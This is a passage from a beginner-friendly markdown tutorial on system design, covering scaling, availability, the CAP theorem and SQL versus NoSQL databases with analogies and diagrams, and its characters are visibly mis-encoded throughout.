# ðŸ—ï¸ System Design â€” From Zero to Planet Scale

> _"System design is just common sense at scale. The hard part is that common sense stops being obvious when millions of things happen at once."_

---

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                                              â•‘
â•‘   You       â†’   1 server   â†’   works great                                  â•‘
â•‘   100 users â†’   1 server   â†’   still fine                                   â•‘
â•‘   10K users â†’   1 server   â†’   getting slow                                 â•‘
â•‘   1M users  â†’   1 server   â†’   ðŸ’¥ server is on fire                         â•‘
â•‘   1B users  â†’   ???        â†’   this is what system design solves             â•‘
â•‘                                                                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

When you build a small app for yourself, you don't think about any of this â€” one laptop, one database, done.
But the moment real people start using your thing, everything breaks in ways you never imagined.
**System design is how you think through those problems before they happen.**

---

## Table of Contents

1. [What even is System Design?](#1-what-even-is-system-design)
2. [The Building Blocks â€” the Lego bricks of every big system](#2-the-building-blocks--the-lego-bricks-of-every-big-system)
3. [Scalability â€” how do you grow without breaking?](#3-scalability--how-do-you-grow-without-breaking)
4. [Availability â€” how do you stay up when things go wrong?](#4-availability--how-do-you-stay-up-when-things-go-wrong)
5. [CAP Theorem â€” the impossible triangle](#5-cap-theorem--the-impossible-triangle)
6. [Databases â€” choosing the right storage](#6-databases--choosing-the-right-storage)
7. [Caching â€” stop asking the same question twice](#7-caching--stop-asking-the-same-question-twice)
8. [Load Balancers â€” the traffic cops](#8-load-balancers--the-traffic-cops)
9. [CDN â€” the world is big, servers are slow](#9-cdn--the-world-is-big-servers-are-slow)
10. [Message Queues â€” don't do things right now](#10-message-queues--dont-do-things-right-now)
11. [API Gateway â€” the front door](#11-api-gateway--the-front-door)
12. [Rate Limiting â€” slowing down the greedy](#12-rate-limiting--slowing-down-the-greedy)
13. [Database Sharding â€” cutting the data pie](#13-database-sharding--cutting-the-data-pie)
14. [Replication â€” keeping backups alive](#14-replication--keeping-backups-alive)
15. [Microservices vs Monolith â€” one big thing or many small things?](#15-microservices-vs-monolith--one-big-thing-or-many-small-things)
16. [Real World Examples â€” how the big apps actually work](#16-real-world-examples--how-the-big-apps-actually-work)
17. [The System Design Interview Playbook](#17-the-system-design-interview-playbook)
18. [Key Numbers Every Designer Should Know](#18-key-numbers-every-designer-should-know)
19. [Glossary](#19-glossary)
20. [Single Server Setup â€” where every system starts](#20-single-server-setup--where-every-system-starts)
21. [API Design â€” the contract between systems](#21-api-design--the-contract-between-systems)
22. [API Protocols â€” the languages systems use to talk](#22-api-protocols--the-languages-systems-use-to-talk)
23. [Transport Layer â€” TCP and UDP](#23-transport-layer--tcp-and-udp)
24. [RESTful APIs â€” the most popular way to build APIs](#24-restful-apis--the-most-popular-way-to-build-apis)
25. [GraphQL â€” fetch exactly what you need](#25-graphql--fetch-exactly-what-you-need)
26. [Authentication â€” proving who you are](#26-authentication--proving-who-you-are)
27. [Authorization â€” what you're allowed to do](#27-authorization--what-youre-allowed-to-do)
28. [Security â€” keeping the bad guys out](#28-security--keeping-the-bad-guys-out)

---

## 1. What even is System Design?

### The pizza shop analogy

Imagine you open a pizza shop.

Day 1 â€” it's just you. You take the order, make the pizza, and deliver it. Simple.

Now imagine your shop goes viral on Instagram. Suddenly 500 people want pizza at the same time. What happens?

- You can't take 500 orders yourself
- Your one oven can't cook 500 pizzas simultaneously
- You only have one delivery guy
- If your oven breaks, the whole shop shuts down

**System design is figuring out â€” before this happens â€” how you'll handle it.**

You'd hire more staff, buy more ovens, hire more delivery drivers, and set up a proper order management system. You'd think about: what if the cash register breaks? What if delivery guy 3 calls in sick? The answers are your "system design".

Now replace "pizza shop" with "Instagram" or "Google" and you get the idea.

---

### The journey from 1 user to 1 billion users

What actually breaks at each scale â€” and how you fix it:

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  USERS         WHAT'S HAPPENING            WHAT BREAKS / WHAT YOU ADD   â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  1 - 100    â†’  Laptop as a server          Nothing breaks. Enjoy it.    â•‘
â•‘                                                                          â•‘
â•‘  1K         â†’  Cloud server (single)       Getting a bit slow on        â•‘
â•‘                                            read-heavy queries            â•‘
â•‘                                            FIX: Add caching (Redis)     â•‘
â•‘                                                                          â•‘
â•‘  10K        â†’  Traffic spikes unpredictably Server sometimes crashes    â•‘
â•‘                                            FIX: Load balancer +         â•‘
â•‘                                            2-3 servers                  â•‘
â•‘                                                                          â•‘
â•‘  100K       â†’  DB is the bottleneck        Queries take seconds         â•‘
â•‘                                            FIX: Read replicas,          â•‘
â•‘                                            better indexing              â•‘
â•‘                                                                          â•‘
â•‘  1M         â†’  Everything is slow          Static files slow, DB huge   â•‘
â•‘                                            FIX: CDN for static,         â•‘
â•‘                                            DB sharding                  â•‘
â•‘                                                                          â•‘
â•‘  10M        â†’  One codebase is unmaintainable Teams blocking each other â•‘
â•‘                                            FIX: Microservices,          â•‘
â•‘                                            message queues               â•‘
â•‘                                                                          â•‘
â•‘  100M+      â†’  Global users, data laws     Latency, compliance          â•‘
â•‘                                            FIX: Multi-region deploy,    â•‘
â•‘                                            geo-sharding                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---

### What a request actually does when you type a URL

Before anything else, let's trace what happens when you type `google.com` and press Enter. This flow is the foundation of everything in system design.

```mermaid
sequenceDiagram
    participant Y as ðŸ§‘ You (Browser)
    participant D as ðŸŒ DNS Server
    participant C as ðŸ“¦ CDN
    participant LB as âš–ï¸ Load Balancer
    participant S as ðŸ–¥ï¸ App Server
    participant CA as âš¡ Cache (Redis)
    participant DB as ðŸ—„ï¸ Database

    Y->>D: "What's the IP address of google.com?"
    D-->>Y: "It's 142.250.80.46"
    Y->>C: "Give me google.com's homepage"
    C-->>Y: "Here's the cached HTML/CSS/images" (fast!)

    Note over Y,DB: For dynamic data (search results, your Gmail):
    Y->>LB: "Search for 'system design'"
    LB->>S: Forwards to least-busy server
    S->>CA: "Do I have cached results for this?"
    CA-->>S: "Nope, not cached"
    S->>DB: "SELECT * FROM search_index WHERE..."
    DB-->>S: Results
    S->>CA: "Cache these results for 5 minutes"
    S-->>LB: Here are the results
    LB-->>Y: Here are your search results
```

**Every step in this diagram is a concept in system design.** The rest of this document explains each one in depth.

---

## 2. The Building Blocks â€” the Lego bricks of every big system

Every large system â€” Twitter, Uber, Netflix â€” is assembled from the same set of building blocks. Master these and you can design almost anything.

```mermaid
graph TD
    User["ðŸ‘¤ User\n(Browser / Mobile App)"]
    DNS["ðŸŒ DNS\nThe phone book of the internet\nConverts names to addresses"]
    CDN["ðŸ“¦ CDN\nCity-level cache\nServes static files near users"]
    LB["âš–ï¸ Load Balancer\nTraffic cop\nSplits work across servers"]
    API["ðŸšª API Gateway\nFront door\nAuth + routing + rate limiting"]
    S1["ðŸ–¥ï¸ App Server 1"]
    S2["ðŸ–¥ï¸ App Server 2"]
    S3["ðŸ–¥ï¸ App Server 3"]
    Cache["âš¡ Cache  Redis \nPost-it notes\nFast memory for hot data"]
    DB["ðŸ—„ï¸ Primary DB\nThe truth\nAll writes go here"]
    DBR["ðŸ—„ï¸ Replica DBs\nBackup readers\nAccepts read queries only"]
    Queue["ðŸ“¬ Message Queue\nTo-do list\nJobs processed at own pace"]
    Worker["âš™ï¸ Worker\nBackground processor\nDoes the heavy lifting async"]
    Storage["ðŸª£ Object Storage\nWarehouse\nImages, videos, large files"]

    User -->|"types URL"| DNS
    User <-->|"images, CSS, JS, videos"| CDN
    DNS -->|"returns IP"| LB
    LB -->|"routes request"| API
    API --> S1
    API --> S2
    API --> S3
    S1 <-->|"read/write"| Cache
    S2 <-->|"read/write"| Cache
    S3 <-->|"read/write"| Cache
    Cache -->|"cache miss"| DB
    DB -->|"replicates data"| DBR
    S1 -->|"queue a job"| Queue
    Queue -->|"delivers job"| Worker
    Worker -->|"writes result"| DB
    S1 <-->|"upload/download files"| Storage
```

---

### What each block does â€” with real analogies

| Block              | What it does                                                                  | Real-world analogy                                                                     |
| ------------------ | ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| **DNS**            | Converts `facebook.com` into `157.240.22.35` so computers can find each other | Phone book â€” you look up "Alice" to get her number                                     |
| **CDN**            | Keeps copies of images, videos, CSS in servers physically close to users      | A newspaper printing facility in every city â€” you don't ship all papers from one place |
| **Load Balancer**  | Sits in front of your servers and divides incoming traffic across them        | Airport check-in desk â€” "Counter 3 is free, please go there"                           |
| **API Gateway**    | Single entry point for all traffic â€” checks auth, routes to the right service | Hotel reception â€” one desk handles room keys, complaints, and directions               |
| **App Server**     | Runs your actual business logic â€” processes requests, makes decisions         | A chef in the kitchen who processes an order                                           |
| **Cache**          | Fast in-memory store (RAM) for frequently accessed data                       | Post-it notes on your desk â€” faster than going to the filing cabinet                   |
| **Primary DB**     | The permanent home of all your data. Handles reads AND writes                 | The actual filing cabinet â€” source of truth                                            |
| **Replica DB**     | A copy of the primary DB that handles read queries only                       | A photocopy of important documents for reference                                       |
| **Message Queue**  | Holds tasks that need to be done, workers pick them up at their own pace      | A restaurant ticket printer â€” orders pile up, chefs process them one by one            |
| **Worker**         | A background process that eats from the queue                                 | The line cook who handles tickets                                                      |
| **Object Storage** | Cheap, scalable storage for large files (images, videos, backups)             | A warehouse â€” not fast, but holds everything                                           |

---

## 3. Scalability â€” how do you grow without breaking?

**Scalability** = your system's ability to handle more load by adding resources â€” without rewriting everything.

There are exactly two approaches:

---

### Vertical Scaling â€” make the one machine bigger

You have one server. It's getting slow. So you buy a bigger, more powerful server.

```
         BEFORE                          AFTER

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚    Server       â”‚    â”€â”€â”€â”€â”€â”€â–º â”‚    BIGGER Server            â”‚
    â”‚  â– â–  2 CPU cores â”‚            â”‚  â– â– â– â– â– â– â– â– â– â– â– â– â– â–  32 cores    â”‚
    â”‚  â–‘â–‘â–‘ 8GB RAM    â”‚            â”‚  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘ 256GB RAM â”‚
    â”‚  ðŸ’¾ 500GB SSD   â”‚            â”‚  ðŸ’¾ðŸ’¾ðŸ’¾ðŸ’¾ 8TB SSD           â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       handles 1K req/s               handles 20K req/s
```

**When is this the right call?**

- You're just getting started and want simplicity
- Your problem is a single slow database query that needs more RAM
- You need a quick fix before a product launch

**When does it stop working?**

- There's a physical ceiling â€” you can't buy a server with unlimited RAM
- It's expensive disproportionately â€” doubling RAM doesn't just cost double
- It's a **single point of failure** â€” if this one giant machine dies, everything is down

---

### Horizontal Scaling â€” add more machines

Instead of making one machine bigger, you add more identical machines and split the load between them.

```
         BEFORE                          AFTER

    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚    Server       â”‚  â”€â”€â”€â–º â”‚ Server 1 â”‚  â”‚ Server 2 â”‚  â”‚ Server 3 â”‚
    â”‚    (struggling) â”‚       â”‚ 8GB RAM  â”‚  â”‚ 8GB RAM  â”‚  â”‚ 8GB RAM  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
                                   â”‚              â”‚             â”‚
                              â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                              â”‚
                                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                    â”‚   Load Balancer     â”‚
                                    â”‚  (splits traffic)   â”‚
                                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                              â”‚
                                         All traffic
```

**Why this is better at scale:**

- No ceiling â€” just keep adding machines
- One server dying doesn't kill the app â€” others pick up the slack
- Cheap commodity hardware instead of expensive specialised servers
- You can scale different parts independently

**The one catch: your app must be stateless**

```
âŒ Stateful server (bad for horizontal scaling):
   User logs in â†’ Session stored on Server 1
   Next request â†’ Load balancer sends to Server 2
   Server 2: "Who are you? I've never seen you before"
   User is logged out. Bad experience.

âœ… Stateless server (works with horizontal scaling):
   User logs in â†’ Session stored in shared Redis cache
   Next request â†’ Goes to ANY server
   Any server: "Let me check Redis... yes, you're logged in"
   Works perfectly.
```

> **The key insight:** Stateless servers don't remember you between requests. All "memory" lives in a shared external store (Redis, a database). This is what makes horizontal scaling possible.

---

### When to use which

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  START HERE                                                       â”‚
â”‚                                                                   â”‚
â”‚  Is your app in early stage / small team?                        â”‚
â”‚          â”‚                                                        â”‚
â”‚     YES â”€â”¤â”€â”€â–º Vertical scaling. Simple, no overhead.            â”‚
â”‚          â”‚                                                        â”‚
â”‚     NO   â”‚                                                        â”‚
â”‚          â”‚                                                        â”‚
â”‚  Is the bottleneck one specific thing (e.g. DB needs more RAM)?  â”‚
â”‚          â”‚                                                        â”‚
â”‚     YES â”€â”¼â”€â”€â–º Scale that component vertically.                  â”‚
â”‚          â”‚                                                        â”‚
â”‚     NO   â”‚                                                        â”‚
â”‚          â”‚                                                        â”‚
â”‚          â””â”€â”€â–º Horizontal scaling. Accept the complexity.         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## 4. Availability â€” how do you stay up when things go wrong?

**Availability** is simply: what percentage of time is your system actually working and reachable by users?

It sounds simple, but getting from "pretty reliable" to "almost never down" is one of the hardest engineering problems.

### The nines â€” what they actually mean

| Availability | Downtime per year | Downtime per month | What it means in practice                               |
| ------------ | ----------------- | ------------------ | ------------------------------------------------------- |
| 90%          | 36.5 days         | ~3 days            | Awful. Users will leave.                                |
| 99%          | 3.65 days         | ~7 hours           | Acceptable for hobby projects                           |
| 99.9%        | 8.7 hours         | ~44 minutes        | "Three nines" â€” industry standard for good services     |
| 99.99%       | 52 minutes        | ~4 minutes         | "Four nines" â€” what serious production services aim for |
| 99.999%      | 5 minutes         | ~26 seconds        | "Five nines" â€” telephone networks, banking              |
| 99.9999%     | 30 seconds        | ~3 seconds         | Practically unachievable at reasonable cost             |

> **52 minutes of downtime per year** sounds like a lot, but achieving "four nines" (99.99%) requires extremely careful engineering. AWS targets this. Most companies settle for 99.9%.

---

### Single Point of Failure â€” the #1 enemy of availability

A **single point of failure (SPOF)** is any component whose failure brings down the entire system.

```
SYSTEM WITH SPOF:                    SAME SYSTEM WITHOUT SPOF:

 Users                                Users
   â”‚                                    â”‚
   â–¼                                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Server  â”‚ â† if this dies,     â”‚ Load Balancerâ”‚ â† if this dies,
â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜   everything ends   â””â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”˜   deploy a backup LB
     â”‚                              â”‚        â”‚
     â–¼                              â–¼        â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Single  â”‚ â† if this dies,   â”‚ Server â”‚ â”‚ Server â”‚
â”‚    DB    â”‚   all data gone   â”‚   A    â”‚ â”‚   B    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â””â”€â”€â”€â”¬â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                                   â”‚           â”‚
                                   â–¼           â–¼
                              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                              â”‚Primary  â”‚ â”‚  Replica  â”‚ â† if Primary dies,
                              â”‚   DB    â”‚ â”‚    DB     â”‚   Replica takes over
                              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### How availability is achieved in practice

```mermaid
graph TD
    A["High Availability Goals"]

    A --> R["ðŸ” Redundancy\nDuplicate every critical component\nNo single point of failure"]
    A --> F["âš¡ Failover\nAutomatic switch to backup\nwhen primary fails"]
    A --> H["ðŸ’“ Health Checks\nConstantly ping components\nRemove unhealthy ones from rotation"]
    A --> GD["ðŸŒ Geographic Distribution\nRun in multiple regions\nOne region goes down, others take over"]
    A --> GR["ðŸ”„ Graceful Degradation\nIf search is down, show cached results\nDon't fail completely, fail partially"]

    R --> R1["Multiple servers\nbehind load balancer"]
    R --> R2["Database replicas\nin different zones"]
    F --> F1["Automatic: system detects\ndeath and promotes backup\n(seconds)"]
    F --> F2["Manual: human intervenes\n(minutes to hours)"]
    H --> H1["Load balancer sends traffic\nonly to healthy servers"]
    H --> H2["Failed server gets\npulled from rotation"]
```

---

### Graceful Degradation â€” fail smart, not hard

The best systems don't crash completely when something breaks. They degrade gracefully â€” they limp along, serving _some_ functionality.

```
âŒ Not graceful:
   Recommendation service is down
   â†’ Entire homepage crashes with 500 error
   â†’ User can't do anything

âœ… Graceful degradation:
   Recommendation service is down
   â†’ Homepage shows generic popular items instead of personalised ones
   â†’ User can still browse, search, buy
   â†’ They don't even notice the recommendation engine is broken
```

> Facebook's core feed might go down, but you can still see your profile. Netflix's recommendations might fail, but you can still search and play movies. This is graceful degradation by design.

---

## 5. CAP Theorem â€” the impossible triangle

This is one of the most famous ideas in all of distributed systems, and it's surprisingly intuitive once you see it clearly.

### What the three letters mean

**C â€” Consistency:** Every read gets the most recent write. If you just updated your profile picture, and your friend loads your profile right now, they see the new one. Not the old one. Always.

**A â€” Availability:** The system always responds. Maybe the data is slightly old, but it never just says "I'm busy" or "I'm down". It always gives you _something_.

**P â€” Partition Tolerance:** The system keeps working even if the network between some of its machines breaks (a "partition" = a communication split between nodes).

---

### The catch

```
                         âœ¨ Consistency âœ¨
                        "Every read gets
                         the latest write"
                               â–²
                              /|\
                             / | \
                            /  |  \
                           /   |   \
                          / CP | CA  \
                         /     |     \
                        /      |      \
                       â–¼       |       â–¼
          Availability â—„â”€â”€â”€â”€â”€â”€â”€â”¤â”€â”€â”€â”€â”€â”€â–º Partition
          "System always        |        Tolerance
           responds"     AP     |    "Works even if
                                |     network splits"
                                â”‚
                      In practice, P is not
                      optional. Networks DO fail.
                      So you pick C or A.
```

**Why P isn't truly optional:**

In any distributed system (multiple machines), network failures happen. A cable gets unplugged. A switch fails. A datacenter loses power. When this happens, your nodes can't talk to each other â€” that's a partition.

Your system has to decide: do you want to **stay consistent** during the partition (refuse to respond until the split heals), or **stay available** (keep responding, even if some nodes have stale data)?

**That's the real choice: CP or AP.**

```
                CP Systems                          AP Systems
         (Consistent + Partition Tolerant)   (Available + Partition Tolerant)

    âœ… Every read = most recent write      âœ… System always responds
    âŒ Might refuse requests during         âŒ Might give slightly old data
       a network partition                    during a partition

    Use for: Bank balances, medical         Use for: Shopping carts, social
    records, booking systems                media feeds, product catalogs
    (wrong data = real harm)               (slightly stale = fine)

    Examples: PostgreSQL, MySQL,           Examples: Cassandra, DynamoDB,
    HBase, Zookeeper                       CouchDB, DNS
```

---

### A concrete example to make it click

Imagine you have a bank and your database is split across two data centres. Suddenly the network cable between them breaks.

```
Data Centre A                          Data Centre B
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    âŒ BROKEN âŒ    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  DB Node A     â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚  DB Node B     â”‚
â”‚  Balance: Â£500 â”‚   network split    â”‚  Balance: Â£500 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚                                     â”‚
   User in UK                          User in USA
   withdraws Â£300                      No action
```

Now what?

**If CP:** Node A says "I can't confirm with Node B â€” I won't process this withdrawal. Error 503." The user is unhappy but the data is safe.

**If AP:** Node A says "I'll process it â€” balance is now Â£200." Meanwhile Node B still thinks the balance is Â£500. If the US user also withdraws Â£400 at the same time from Node B... the bank loses money. Bad.

> **Banks are CP.** Your Twitter feed is AP (seeing a tweet 3 seconds late = fine).

---

## 6. Databases â€” choosing the right storage

The database is where all your data lives permanently. Picking the wrong one is one of the most painful mistakes in engineering because changing it later is horrible.

---

### SQL â€” the spreadsheet model

SQL databases store data in **tables** (like spreadsheets), with **rows** (records) and **columns** (fields). The big thing is: tables can be **related** to each other using IDs.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         users                   â”‚     â”‚              orders                  â”‚
â”œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ id â”‚ name       â”‚ email         â”‚     â”‚ id â”‚ user_id â”‚ amount   â”‚ status    â”‚
â”œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  1 â”‚ Alice      â”‚ a@gmail.com  â”‚â—„â”€â”€â”€â”€â”‚  1 â”‚    1    â”‚ Â£49.99   â”‚ delivered â”‚
â”‚  2 â”‚ Bob        â”‚ b@gmail.com  â”‚â—„â”€â”€â” â”‚  2 â”‚    1    â”‚ Â£12.00   â”‚ pending   â”‚
â”‚  3 â”‚ Charlie    â”‚ c@gmail.com  â”‚   â””â”€â”‚  3 â”‚    2    â”‚ Â£109.50  â”‚ delivered â”‚
â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

You can run a query like: _"Give me all orders over Â£50 for users who signed up before 2024"_ â€” joining the two tables together. This is the superpower of SQL.

**The ACID guarantee â€” what makes SQL trustworthy:**

```
A â€” Atomicity:    A transaction either fully succeeds or fully fails.
                  Transfer Â£100 from Alice to Bob:
                  âœ… Alice -Â£100 AND Bob +Â£100 (both happen)
                  âŒ Never: Alice -Â£100 but Bob stays the same (partial)

C â€” Consistency:  After every transaction, all rules are still valid.
                  Can't have an Order with a user_id that doesn't exist.

I â€” Isolation:    Two transactions happening at the same time don't
                  interfere with each other. Like they're queued up.

D â€” Durability:   Once committed, data survives a crash.
                  The database doesn't "forget" after a power cut.
```

**Use SQL for:** Banking, e-commerce, any system where data relationships matter and you cannot afford incorrect data.

Popular choices: PostgreSQL, MySQL, SQLite, Microsoft SQL Server

---

### NoSQL â€” the flexible model

NoSQL doesn't mean "no SQL" â€” it means "not only SQL". There's no single type of NoSQL â€” there are four very different flavours, each built for a specific kind of problem.

```mermaid
graph TD
    Problem["What kind of data are you storing?"]

    Problem --> Q1{"Is it structured\nwith relationships?"}
    Q1 -->|"Yes"| SQL["ðŸ”· SQL\nPostgres, MySQL"]

    Q1 -->|"No"| Q2{"Is it flexible\nJSON-like documents?"}
    Q2 -->|"Yes"| Doc["ðŸ“„ Document DB\nMongoDB, Firestore\n\nEach record is a\nself-contained JSON blob.\nFields can differ per record."]

    Q1 -->|"No"| Q3{"Is it simple\nlookup by key?"}
    Q3 -->|"Yes"| KV["ðŸ”‘ Key-Value\nRedis, DynamoDB\n\nLike a dictionary.\nGive me the thing\nstored under this key."]

    Q1 -->|"No"| Q4{"Is it massive amounts\nof time-series / event data?"}
    Q4 -->|"Yes"| Wide["ðŸ“Š Wide Column\nCassandra, HBase\n\nBuilt for billions of rows.\nEach row can have different\ncolumns. Fast writes."]

    Q1 -->|"No"| Q5{"Is it relationships\nbetween entities?"}
    Q5 -->|"Yes"| Graph["ðŸ•¸ï¸ Graph DB\nNeo4j\n\nNodes = things\nEdges = relationships\nPerfect for social networks"]
```

---

### Document DB â€” a filing cabinet with flexible folders

```
SQL way:                              MongoDB way:
users table + addresses table         One self-contained document:

SELECT u.name, a.city               {
FROM users u                           "name": "Alice",
JOIN addresses a                       "email": "a@gmail.com",
ON u.id = a.user_id                    "addresses": [
WHERE u.id = 1;                           {"city": "London", "primary": true},
                                          {"city": "Manchester"}
                                       ],
                                       "preferences": {
                                          "theme": "dark",
                                          "notifications": false
                                       }
                                    }
```

No joins needed â€” everything about Alice is in one document. Great for reading. Bad if you need to query across many documents in complex ways.

---

### ACID (SQL) vs BASE (NoSQL) â€” the philosophy difference

|              | **ACID** (SQL)                                          | **BASE** (NoSQL)                                                       |
| ------------ | ------------------------------------------------------- | ---------------------------------------------------------------------- |
| **Priority** | Correctness above all else                              | Availability above all else                                            |
| **A / BA**   | **A**tomic â€” all or nothing                             | **B**asically **A**vailable â€” always responds                          |
| **C / S**    | **C**onsistent â€” rules always apply                     | **S**oft state â€” might be temporarily inconsistent                     |
| **I / E**    | **I**solated â€” transactions don't interfere             | **E**ventually consistent â€” will be correct... eventually              |
| **D**        | **D**urable â€” survives crashes                          | Depends on config                                                      |
